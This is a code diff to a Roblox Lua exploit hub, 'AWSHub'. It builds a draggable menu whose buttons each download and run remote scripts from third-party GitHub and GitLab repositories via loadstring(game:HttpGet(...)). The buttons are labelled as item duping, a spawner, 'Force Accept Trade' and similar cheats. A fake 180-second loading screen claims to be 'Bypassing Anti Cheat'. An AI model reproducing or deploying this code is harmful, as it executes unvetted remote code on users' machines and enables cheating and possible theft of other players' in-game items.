@@ -2,10 +2,108 @@ local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
+-- Buttons container
+local buttons = {}
+
+-- Create AWSHub GUI with buttons (initially hidden)
+local function createAWSHub()
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "AWSHub"
+    screenGui.ResetOnSpawn = false
+    screenGui.IgnoreGuiInset = true -- Ignore Roblox top bar inset
+    screenGui.Parent = playerGui
+
+    local frame = Instance.new("Frame", screenGui)
+    frame.Size = UDim2.new(0, 250, 0, 320)
+    frame.Position = UDim2.new(0.4, 0, 0.4, 0)
+    frame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+    frame.BorderSizePixel = 0
+    frame.Active = true
+    frame.Draggable = true
+    local uicorner = Instance.new("UICorner", frame)
+    uicorner.CornerRadius = UDim.new(0, 12)
+
+    local function createButton(text, yPos, callback)
+        local btn = Instance.new("TextButton", frame)
+        btn.Size = UDim2.new(0.9, 0, 0, 40)
+        btn.Position = UDim2.new(0.05, 0, 0, yPos)
+        btn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+        btn.Text = text
+        btn.Font = Enum.Font.FredokaOne
+        btn.TextSize = 18
+        btn.TextColor3 = Color3.new(1, 1, 1)
+        btn.AutoButtonColor = true
+        local uicornerBtn = Instance.new("UICorner", btn)
+        uicornerBtn.CornerRadius = UDim.new(0, 8)
+
+        btn.MouseButton1Click:Connect(callback)
+        table.insert(buttons, btn) -- Save to hide/show later
+        return btn
+    end
+
+    createButton("Dupe Script", 10, function()
+        local success, err = pcall(function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/9871abdel/Y/refs/heads/main/Yorbumm"))()
+        end)
+        if not success then warn("Failed to load Dupe script:", err) end
+    end)
+
+    createButton("Dark Spawner V6", 60, function()
+        local success, err = pcall(function()
+            local Spawner = loadstring(game:HttpGet("https://gitlab.com/darkiedarkie/dark/-/raw/main/Spawner.lua"))()
+            if Spawner and Spawner.Load then
+                Spawner.Load()
+            end
+        end)
+        if not success then warn("Failed to load Dark Spawner V6:", err) end
+    end)
+
+    createButton("Instant Age 50", 110, function()
+        local success, err = pcall(function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/9871abdel/Yoo/refs/heads/main/Instant%20age%2050"))()
+        end)
+        if not success then warn("Failed to load Instant Age 50 script:", err) end
+    end)
+
+    createButton("Mutation Reroll", 160, function()
+        local success, err = pcall(function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/9871abdel/Mutation-reroll/refs/heads/main/reroll"))()
+        end)
+        if not success then warn("Failed to load Mutation Reroll script:", err) end
+    end)
+
+    createButton("Force Accept Trade", 210, function()
+        local success, err = pcall(function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/9871abdel/auto-aceept/refs/heads/main/Autoo"))()
+        end)
+        if not success then warn("Failed to load Force Accept Trade script:", err) end
+    end)
+
+    createButton("Egg Randomizer", 260, function()
+        local success, err = pcall(function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/9871abdel/Egg-predict/refs/heads/main/Egg%20predicoo"))()
+        end)
+        if not success then warn("Failed to load Egg Randomizer script:", err) end
+    end)
+    
+    return screenGui, buttons
+end
+
+local awshubGui, awshubButtons = createAWSHub()
+
+-- Hide or show all buttons function
+local function setButtonsVisible(visible)
+    for _, btn in pairs(awshubButtons) do
+        btn.Visible = visible
+    end
+end
+
 -- ======== Loading Screen ========
 local function showLoadingScreen()
     local screenGui = Instance.new("ScreenGui")
     screenGui.Name = "AWSHubLoadingScreen"
+    screenGui.ResetOnSpawn = false
+    screenGui.IgnoreGuiInset = true
     screenGui.Parent = playerGui
 
     -- Full screen dark green background
@@ -56,7 +154,7 @@ local function showLoadingScreen()
     statusText.TextColor3 = Color3.fromRGB(255, 255, 255)
     statusText.TextWrapped = true
     statusText.TextYAlignment = Enum.TextYAlignment.Top
-    statusText.Text = "Loading Duper...\nEgg Predictor...\nMutation..."
+    statusText.Text = "Loading Duper..."
 
     -- Percent text (white)
     local percentText = Instance.new("TextLabel", bg)
@@ -78,19 +176,22 @@ local function showLoadingScreen()
     timeText.TextColor3 = Color3.fromRGB(255, 255, 255)
     timeText.Text = "Estimated time: 180 seconds"
 
+    local totalTime = 180
+    local startTime = os.clock()
+    local progress = 0
+
+    -- Hide buttons during loading
+    setButtonsVisible(false)
+
     local function getStatusMessage(progress)
         if progress <= 25 then
-            return "Loading Duper...\nEgg Predictor...\nMutation..."
+            return "Loading Duper..."
         elseif progress <= 50 then
             return "Loading Dark...\nLoading Freeze...\nTrade..."
         else
             return "Loading Clients...\nBypassing Anti Cheat..."
         end
     end
-
-    local totalTime = 180
-    local startTime = os.clock()
-    local progress = 0
 
     while progress < 100 do
         local elapsed = os.clock() - startTime
@@ -106,86 +207,11 @@ local function showLoadingScreen()
         wait(0.1)
     end
 
+    -- Show buttons after loading ends
+    setButtonsVisible(true)
+
     screenGui:Destroy()
 end
 
--- Show loading screen first
+-- Show loading screen first, then AWSHub GUI
 showLoadingScreen()
-
--- ======== AWSHub GUI ========
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "AWSHub"
-screenGui.ResetOnSpawn = false
-screenGui.Parent = playerGui
-
-local frame = Instance.new("Frame", screenGui)
-frame.Size = UDim2.new(0, 250, 0, 320)
-frame.Position = UDim2.new(0.4, 0, 0.4, 0)
-frame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
-frame.BorderSizePixel = 0
-frame.Active = true
-frame.Draggable = true
-local uicorner = Instance.new("UICorner", frame)
-uicorner.CornerRadius = UDim.new(0, 12)
-
-local function createButton(text, yPos, callback)
-    local btn = Instance.new("TextButton", frame)
-    btn.Size = UDim2.new(0.9, 0, 0, 40)
-    btn.Position = UDim2.new(0.05, 0, 0, yPos)
-    btn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
-    btn.Text = text
-    btn.Font = Enum.Font.FredokaOne
-    btn.TextSize = 18
-    btn.TextColor3 = Color3.new(1, 1, 1)
-    btn.AutoButtonColor = true
-    local uicornerBtn = Instance.new("UICorner", btn)
-    uicornerBtn.CornerRadius = UDim.new(0, 8)
-
-    btn.MouseButton1Click:Connect(callback)
-    return btn
-end
-
-createButton("Dupe Script", 10, function()
-    local success, err = pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/9871abdel/Y/refs/heads/main/Yorbumm"))()
-    end)
-    if not success then warn("Failed to load Dupe script:", err) end
-end)
-
-createButton("Dark Spawner V6", 60, function()
-    local success, err = pcall(function()
-        local Spawner = loadstring(game:HttpGet("https://gitlab.com/darkiedarkie/dark/-/raw/main/Spawner.lua"))()
-        if Spawner and Spawner.Load then
-            Spawner.Load()
-        end
-    end)
-    if not success then warn("Failed to load Dark Spawner V6:", err) end
-end)
-
-createButton("Instant Age 50", 110, function()
-    local success, err = pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/9871abdel/Yoo/refs/heads/main/Instant%20age%2050"))()
-    end)
-    if not success then warn("Failed to load Instant Age 50 script:", err) end
-end)
-
-createButton("Mutation Reroll", 160, function()
-    local success, err = pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/9871abdel/Mutation-reroll/refs/heads/main/reroll"))()
-    end)
-    if not success then warn("Failed to load Mutation Reroll script:", err) end
-end)
-
-createButton("Force Accept Trade", 210, function()
-    local success, err = pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/9871abdel/auto-aceept/refs/heads/main/Autoo"))()
-    end)
-    if not success then warn("Failed to load Force Accept Trade script:", err) end
-end)
-
-createButton("Egg Randomizer", 260, function()
-    local success, err = pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/9871abdel/Egg-predict/refs/heads/main/Egg%20predicoo"))()
-    end)
-    if not success then warn("Failed to load Egg Randomizer script:", err) end
-end)
